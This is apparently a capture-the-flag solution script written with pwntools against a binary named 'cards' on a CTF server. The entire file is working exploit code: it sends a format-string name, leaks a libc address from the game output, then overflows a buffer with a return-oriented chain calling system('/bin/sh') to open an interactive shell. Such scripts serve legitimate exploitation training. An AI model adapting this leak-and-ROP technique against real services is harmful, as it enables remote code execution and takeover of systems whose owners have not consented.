#!/usr/bin/env python3

from pwn import *

exe = ELF("./cards")

context.binary = exe


def conn():
        return process(exe.path)


def send_name(r):
    r.recv()
    r.sendline("%p"*(0x20-2))

def hit(r):
    while True:
        r.sendline("1")
        data = r.recv()
        if(b"Happy Joker" in data):
            log.warn(data)
            index =  data.find(b"Happy Joker")
            exit = int(data[index+12:index+12+15])
            break
    log.warn("exit @ 0x%x", exit)
    return exit

def main():
     #r = conn()
    r = remote("challenges.ctfd.io", 30466)
    pause()

    send_name(r)
    r.recv()
    r.sendline("1")
    
    exit = hit(r)

    libc_address = exit - 0x03a040
    pop_rdi = libc_address + 0x0000000000021112
    binsh = libc_address + 0x18ce17
    system = libc_address + 0x0453a0
    
    log.warn("libc base @ 0x%x", libc_address)
    r.recv()
    for _ in range(3):
        r.sendline("2")
    r.recv()

    payload = b"M"*(0x26)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)
    payload.ljust(0x40, p8(0x4d))

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
